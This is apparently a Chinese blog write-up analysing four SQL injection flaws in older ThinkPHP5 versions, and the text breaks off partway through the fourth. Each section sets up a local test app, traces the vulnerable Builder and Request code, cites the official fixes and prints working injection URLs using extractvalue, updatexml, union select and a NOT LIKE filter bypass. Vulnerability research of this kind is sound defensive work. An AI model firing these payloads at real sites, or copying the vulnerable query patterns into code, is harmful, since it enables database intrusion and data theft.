<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/thinkphp/tpdemo/public/index.php/index/index/index?username[0]=inc&amp;username[1]=extractvalue(1,concat(char(126),database()))&amp;username[2]=1</span><br></pre></td></tr></table></figure>

<p><img src="https://cdnjson.com/images/2023/05/17/image.png" alt="image.png"></p>
<p>官方声明：<a target="_blank" rel="noopener" href="https://github.com/top-think/framework/releases?after=v5.1.7&amp;page=8">https://github.com/top-think/framework/releases?after=v5.1.7&amp;page=8</a></p>
<p><img src="https://cdnjson.com/images/2023/05/17/image886dcbfdca585bdf.png" alt="image886dcbfdca585bdf.png"></p>
<p>发现Builder.php可疑，到thinkphp/library/think/db/Builder.php，找到insert方法，如图</p>
<p><img src="https://cdnjson.com/images/2023/05/17/image9ea905006f6e60d4.png" alt="image9ea905006f6e60d4.png"></p>
<p>在thinkphp/library/think/db/Query.php中记录了我们所有链式查询的详细操作，比如insert，parsePkWhere，withField等</p>
<p>我们这里看到insert方法，是Builder类下的</p>
<p><img src="https://cdnjson.com/images/2023/05/17/imageac8454508dbf822b.png" alt="imageac8454508dbf822b.png"></p>
<p><img src="https://cdnjson.com/images/2023/05/17/imagea7599f06354bc180.png" alt="imagea7599f06354bc180.png"></p>
<p>在query.php的insert方法那里我们传入$data数组，在builder.php中的kinsert方法中由调用了parseData方法</p>
<p><img src="https://cdnjson.com/images/2023/05/17/imagefaa5f37754c30c1f.png" alt="imagefaa5f37754c30c1f.png"></p>
<p>这个方法中第102行经过了parseKey方法处理，但是并没什么处理，直接返回了</p>
<p><img src="https://cdnjson.com/images/2023/05/17/image31cf5a1e6d46fa63.png" alt="image31cf5a1e6d46fa63.png"></p>
<p>如下，这里当我们传入的数组的第一个值是inc或者dec时，我们的val[1]的值没有经过任何过滤就给result，最后return返回，</p>
<p><img src="https://cdnjson.com/images/2023/05/17/image1e811d55a0b3e24b.png" alt="image1e811d55a0b3e24b.png"></p>
<p><img src="https://cdnjson.com/images/2023/05/17/imagebe75ada6b0532307.png" alt="imagebe75ada6b0532307.png"></p>
<p>最后回到insert方法，我们含有恶意代码的$data直接给到了$fields和$values，没有经过任何过滤执行SQL造成了SQL注入漏洞</p>
<p><img src="https://cdnjson.com/images/2023/05/17/image7c2ece9f301e6510.png" alt="image7c2ece9f301e6510.png"></p>
<p>那么有inc，dec，exp三种模式，exp模式其实没有漏洞，为什么呢</p>
<p>在thinkphp/library/think/Request.php中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filterExp</span>(<span class="params">&amp;<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 过滤查询特殊字符</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$value</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT LIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#x27;</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line">        <span class="variable">$value</span> .= <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// TODO 其他安全过滤</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdnjson.com/images/2023/05/17/image0e94e7f12e5b417d.png" alt="image0e94e7f12e5b417d.png"></p>
<p>我们的”exp”变成了”exp “，自然就过滤了</p>
<p>官方修复方案是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;inc&#x27;</span>:</span><br><span class="line">	<span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable">$item</span> . <span class="string">&#x27;+&#x27;</span> . <span class="title function_ invoke__">floatval</span>(<span class="variable">$val</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;dec&#x27;</span>:</span><br><span class="line">	<span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable">$item</span> . <span class="string">&#x27;-&#x27;</span> . <span class="title function_ invoke__">floatval</span>(<span class="variable">$val</span>[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>



<p><img src="https://cdnjson.com/images/2023/05/17/image31cf51bfa2e1ebba.png" alt="image31cf51bfa2e1ebba.png"></p>
<h4 id="ThinkPHP5漏洞分析之SQL注入-二"><a href="#ThinkPHP5漏洞分析之SQL注入-二" class="headerlink" title="ThinkPHP5漏洞分析之SQL注入(二)"></a>ThinkPHP5漏洞分析之SQL注入(二)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">影响版本：</span><br><span class="line">5.1.6&lt;=ThinkPHP&lt;=5.1.7 (非最新的 5.1.8 版本也可利用)</span><br></pre></td></tr></table></figure>



<p>通过以下命令获取测试环境代码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.1.6 tpdemo2</span><br></pre></td></tr></table></figure>

<p>将 <strong>composer.json</strong> 文件的 <strong>require</strong> 字段设置成如下：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.6.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.1.6&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后执行 <code>composer update</code> ，并将 <strong>application/index/controller/Index.php</strong> 文件代码设置如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">db</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>([<span class="string">&#x27;id&#x27;</span> =&gt; <span class="number">1</span>])-&gt;<span class="title function_ invoke__">update</span>([<span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 <strong>config/database.php</strong> 文件中配置数据库相关信息，并开启 <strong>config/app.php</strong> 中的 <strong>app_debug</strong> 和 <strong>app_trace</strong> 。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/thinkphpvul/tpdemo2/public/index.php/index/index?username[0]=point&amp;username[1]=1&amp;username[2]=extractvalue(1,concat(char(126),database()))^&amp;username[3]=0</span><br></pre></td></tr></table></figure>

<p><img src="https://cdnjson.com/images/2023/05/18/image8ca19ad1165f79ab.png" alt="image8ca19ad1165f79ab.png"></p>
<p>官方更新：<a target="_blank" rel="noopener" href="https://github.com/top-think/framework/releases?after=v5.1.7&amp;page=8">https://github.com/top-think/framework/releases?after=v5.1.7&amp;page=8</a></p>
<p><img src="https://cdnjson.com/images/2023/05/18/imagea410bf55b4cec7a2.png" alt="imagea410bf55b4cec7a2.png"></p>
<p><a target="_blank" rel="noopener" href="https://github.com/top-think/framework/compare/v5.1.9...5.1">https://github.com/top-think/framework/compare/v5.1.9...5.1</a></p>
<p>由于我们是update链式查询造成的漏洞，所以我们在thinkphp/library/think/db/Query.php查找update方法</p>
<p><img src="https://cdnjson.com/images/2023/05/18/image8e0eee02f6be8d7c.png" alt="image8e0eee02f6be8d7c.png"></p>
<p>这里我们调用了thinkphp/library/think/db/Connection.php下的update方法，在Connection.php下的update方法内部又调用了builder.php下的update方法</p>
<p><img src="https://cdnjson.com/images/2023/05/18/imageaebca840253eeabb.png" alt="imageaebca840253eeabb.png"></p>
<p><img src="https://cdnjson.com/images/2023/05/18/image2b497c24b0229c06.png" alt="image2b497c24b0229c06.png"></p>
<p>如下图，我们在builder.php内的update方法又调用了parseData方法</p>
<p><img src="https://cdnjson.com/images/2023/05/18/imagea333e0dd58ac27dc.png" alt="imagea333e0dd58ac27dc.png"></p>
<p>如下图，上次我们产生漏洞的地方是因为case inc 和case dec没有做好限制，将传入数组的第二个值代入了造成漏洞，在现在这个5.1.6版本添加了default默认项</p>
<p><img src="https://cdnjson.com/images/2023/05/18/image135ea5826a355fb0.png" alt="image135ea5826a355fb0.png"></p>
<p><img src="https://cdnjson.com/images/2023/05/18/imageb441c2598013889b.png" alt="imageb441c2598013889b.png"></p>
<p>default这里调用了parseArrayData方法，实际上调的是thinkphp/library/think/db/builder/Mysql.php下的parseArrayData方法</p>
<p>这里我们传入的Query $query, $data，<em>q<strong>u</strong>ery</em>是一个<em>Q<strong>u</strong>ery</em>对象实例，该方法首先获取data数组中的第一个元素，并赋值给data数组中的第一个元素，并赋值给type变量</p>
<p><img src="https://cdnjson.com/images/2023/05/18/imageb3e3221e109c5d8a.png" alt="imageb3e3221e109c5d8a.png"></p>
<p>strtolower将我们的第一个元素变成小写之后如果case等于point，那么如果数组中存在第三个元素，则将其赋值给data中存在第三个元素，则将其赋值给fun变量。否则，将$fun默认设置为’GeomFromText’。</p>
<p>也就是令$fun = $data[2],$point = $data[3]</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="variable">$fun</span> . <span class="string">&#x27;(\&#x27;&#x27;</span> . <span class="variable">$point</span> . <span class="string">&#x27;(&#x27;</span> . <span class="variable">$value</span> . <span class="string">&#x27;)\&#x27;)&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>这里我们利用$fun进行注入的payload就是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/thinkphpvul/tpdemo2/public/index.php/index/index?username[0]=point&amp;username[1]=1&amp;username[2]=extractvalue(1,concat(char(126),database()))^&amp;username[3]=0</span></span><br></pre></td></tr></table></figure>

<p>那么根据脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$value</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$point</span> = <span class="string">&quot;0&quot;</span>;</span><br><span class="line"><span class="variable">$fun</span> = <span class="string">&quot;extractvalue(1,concat(char(126),database()))^&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$fun</span> . <span class="string">&#x27;(\&#x27;&#x27;</span> . <span class="variable">$point</span> . <span class="string">&#x27;(&#x27;</span> . <span class="variable">$value</span> . <span class="string">&#x27;)\&#x27;)&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="comment">//   extractvalue(1,concat(char(126),database()))^(&#x27;0(1)&#x27;)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>执行结果就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select extractvalue(1,concat(char(126),database()))^(&#x27;0(1)&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdnjson.com/images/2023/05/18/image36eb72253dedb86c.png" alt="image36eb72253dedb86c.png"></p>
<p>最后回到builder.php中的update方法内，我们的set数组就是我们传入的内容被分成键和值组合起来了，替换了%set%，执行了updateSql操作，造成报错注入</p>
<p><img src="https://cdnjson.com/images/2023/05/18/imaged3ffbc016fd77a44.png" alt="imaged3ffbc016fd77a44.png"></p>
<p>同样的我们的payload还可以有多种：</p>
<p>例如我们组成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1^(&#x27;&#x27;)^extractvalue(1,concat(char(126),database()))-- -(1)&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdnjson.com/images/2023/05/18/imageb05ea6378a4ef028.png" alt="imageb05ea6378a4ef028.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$value</span> = <span class="string">&quot;1&quot;</span>;  <span class="comment">// username[1]</span></span><br><span class="line"><span class="variable">$point</span> = <span class="string">&quot;&#x27;)^extractvalue(1,concat(char(126),database()))-- -&quot;</span>;</span><br><span class="line"><span class="variable">$fun</span> = <span class="string">&quot;1^&quot;</span>; <span class="comment">// username[2]</span></span><br><span class="line"><span class="variable">$result2</span> = <span class="variable">$fun</span> . <span class="string">&#x27;(\&#x27;&#x27;</span> . <span class="variable">$point</span> . <span class="string">&#x27;(&#x27;</span> . <span class="variable">$value</span> . <span class="string">&#x27;)\&#x27;)&#x27;</span>;</span><br><span class="line"><span class="comment">// extractvalue(1,concat(char(126),database()))^(&#x27;0(1)&#x27;)</span></span><br><span class="line"><span class="comment">// 1^(&#x27;&#x27;)^extractvalue(1,concat(char(126),database()))-- (1)&#x27;)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result2</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/thinkphpvul/tpdemo2/public/index.php/index/index?username[0]=point&amp;username[1]=1&amp;username[2]=1^&amp;username[3]=&#x27;)^extractvalue(1,concat(char(126),database()))-- -</span><br></pre></td></tr></table></figure>

<p><img src="https://cdnjson.com/images/2023/05/18/imageecf2c4bbfb813f22.png" alt="imageecf2c4bbfb813f22.png"></p>
<p>一样可以执行</p>
<p>官方修复方案就是直接将 <strong>parseArrayData</strong> 方法删除了</p>
<h4 id="ThinkPHP5漏洞分析之SQL注入-三"><a href="#ThinkPHP5漏洞分析之SQL注入-三" class="headerlink" title="ThinkPHP5漏洞分析之SQL注入(三)"></a>ThinkPHP5漏洞分析之SQL注入(三)</h4><p>通过以下命令获取测试环境代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">影响版本：5.0.10</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.0.10 tpdemo4</span><br></pre></td></tr></table></figure>

<p>将 <strong>composer.json</strong> 文件的 <strong>require</strong> 字段设置成如下：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.4.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.0.10&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>

<p>然后执行 <code>composer update</code> ，并将 <strong>application/index/controller/Index.php</strong> 文件代码设置如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">db</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;exp&#x27;</span>,<span class="variable">$username</span>)-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;select success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 <strong>config/database.php</strong> 文件中配置数据库相关信息，并开启 <strong>config/app.php</strong> 中的 <strong>app_debug</strong> 和 <strong>app_trace</strong> </p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/thinkphpvul/tpdemo4/public/index.php/index/index/index?username=) union select updatexml(1,concat(0x7,user(),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdnjson.com/images/2023/05/18/image693887cccf9ea155.png" alt="image693887cccf9ea155.png"></p>
<p>同之前，找到thinkphp/library/think/db/Query.php下的where链式查询，这里调用了parseWhereExp方法</p>
<p><img src="https://cdnjson.com/images/2023/05/18/image038610f3b83c2b94.png" alt="image038610f3b83c2b94.png"></p>
<p>这个方法没什么好说的，然后直接返回后又调用了select方法</p>
<p><img src="https://cdnjson.com/images/2023/05/18/image5532dce84b13805e.png" alt="image5532dce84b13805e.png"><img src="https://cdnjson.com/images/2023/05/18/imageacc246ef044c3628.png" alt="imageacc246ef044c3628.png"></p>
<p>这里又调用了builder.php下的select方法</p>
<p>我们将%WHERE%替换成了$this-&gt;parseWhere($options[‘where’], $options)</p>
<p><img src="https://cdnjson.com/images/2023/05/18/imageb3d18a6b5f423e5a.png" alt="imageb3d18a6b5f423e5a.png"></p>
<p>在parseWhere方法中，又调用了buildWhere方法</p>
<p><img src="https://cdnjson.com/images/2023/05/18/imagedfe448733213292c.png" alt="imagedfe448733213292c.png"></p>
<p><img src="https://cdnjson.com/images/2023/05/18/imagedfe448733213292c.png" alt="imagedfe448733213292c.png"></p>
<p>这里内部又调用了parseWhereItem方法-where子单元分析</p>
<p><img src="https://cdnjson.com/images/2023/05/18/imagebb2b0eb8885cb2b6.png" alt="imagebb2b0eb8885cb2b6.png"></p>
<p>在parseWhereItem方法内部，当操作符等于exp时</p>
<p><img src="https://cdnjson.com/images/2023/05/18/imaged62d6b98249f9164.png" alt="imaged62d6b98249f9164.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$whereStr</span> .= <span class="string">&#x27;( &#x27;</span> . <span class="variable">$key</span> . <span class="string">&#x27; &#x27;</span> . <span class="variable">$value</span> . <span class="string">&#x27; )&#x27;</span>;</span><br><span class="line">最后</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$whereStr</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdnjson.com/images/2023/05/18/image5843238ae3869266.png" alt="image5843238ae3869266.png"></p>
<p>最后执行造成SQL注入，那么payload如何构造呢</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/thinkphpvul/tpdemo4/public/index.php/index/index/index?username=) union select updatexml(1,concat(0x7,user(),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$whereStr</span> .= <span class="string">&#x27;( &#x27;</span> . <span class="variable">$key</span> . <span class="string">&#x27; &#x27;</span> . <span class="variable">$value</span> . <span class="string">&#x27; )&#x27;</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$key</span> = <span class="string">&#x27;username&#x27;</span>;</span><br><span class="line"><span class="variable">$value</span> = <span class="string">&quot;) union select updatexml(1,concat(0x7,user(),0x7e),1)--+&quot;</span>;</span><br><span class="line"><span class="variable">$whereStr</span> .= <span class="string">&#x27;( &#x27;</span> . <span class="variable">$key</span> . <span class="string">&#x27; &#x27;</span> . <span class="variable">$value</span> . <span class="string">&#x27; )&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$whereStr</span>;</span><br><span class="line"><span class="comment">//    ( username ) union select updatexml(1,concat(0x7,user(),0x7e),1)--+ )</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>执行的就是</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> ( username ) <span class="keyword">union</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">-- - );</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdnjson.com/images/2023/05/18/imageaddc2124de6271ab.png" alt="imageaddc2124de6271ab.png"></p>
<p>当然，这里是当你这么写的时候存在漏洞</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">db</span>(<span class="string">&#x27;app01_userinfo&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;exp&#x27;</span>,<span class="variable">$username</span>)-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;select success&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="ThinkPHP5漏洞分析之SQL注入-四"><a href="#ThinkPHP5漏洞分析之SQL注入-四" class="headerlink" title="ThinkPHP5漏洞分析之SQL注入(四)"></a>ThinkPHP5漏洞分析之SQL注入(四)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">影响版本：</span><br><span class="line">ThinkPHP&lt;=5.0.11</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">db</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>([<span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>])-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>payload：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/thinkphpvul/tpdemo4/public/index.php/index/index/index?username[0]=not%20like&amp;username[1][0]=%%&amp;username[1][1]=233&amp;username[2]=)%20union%20select%201,database()%23</span><br></pre></td></tr></table></figure>

<p><img src="https://cdnjson.com/images/2023/05/18/imagec9af240067fef554.png" alt="imagec9af240067fef554.png"></p>
<p><a target="_blank" rel="noopener" href="https://github.com/top-think/framework/compare/v5.0.11...master">https://github.com/top-think/framework/compare/v5.0.11...master</a></p>
<p>不管以哪种方式传递数据给服务器，这些数据在 <strong>ThinkPHP</strong> 中都会经过 <strong>Request</strong> 类的 <strong>input</strong> 方法</p>
<p>数据不仅会被强制类型转换，还都会经过 <strong>filterValue</strong> 方法的处理。该方法是用来过滤表单中的表达式，但是我们仔细看其代码，会发现少过滤了 <strong>NOT LIKE</strong> ，而本次漏洞正是利用了这一点。</p>
<p><img src="https://cdnjson.com/images/2023/05/18/imagef9387797f1e6db53.png" alt="imagef9387797f1e6db53.png"></p>
<p><img src="https://cdnjson.com/images/2023/05/18/image6259666043d64b3f.png" alt="image6259666043d64b3f.png"></p>
<p>filterValue方法最后return回调了filterExp方法，这个方法过滤了一些东西</p>
<p><img src="https://cdnjson.com/images/2023/05/18/image48cbd1d6a2256025.png" alt="image48cbd1d6a2256025.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$value</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#x27;</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line">    <span class="variable">$value</span> .= <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>少过滤了 <strong>NOT LIKE</strong></p>
<p>回到query类下的where链式查询</p>
<p><img src="https://cdnjson.com/images/2023/05/18/image5e8db5926c09b121.png" alt="image5e8db5926c09b121.png"></p>
<p>内部又调用了parseWhereExp方法，然后再返回并继续调用 <strong>select</strong> 方法准备开始构建 <strong>select</strong> 语句，和上一个是一样的</p>
<p>在builder.php中的select方法中，继续parseWhere方法中的buildWhere方法</p>
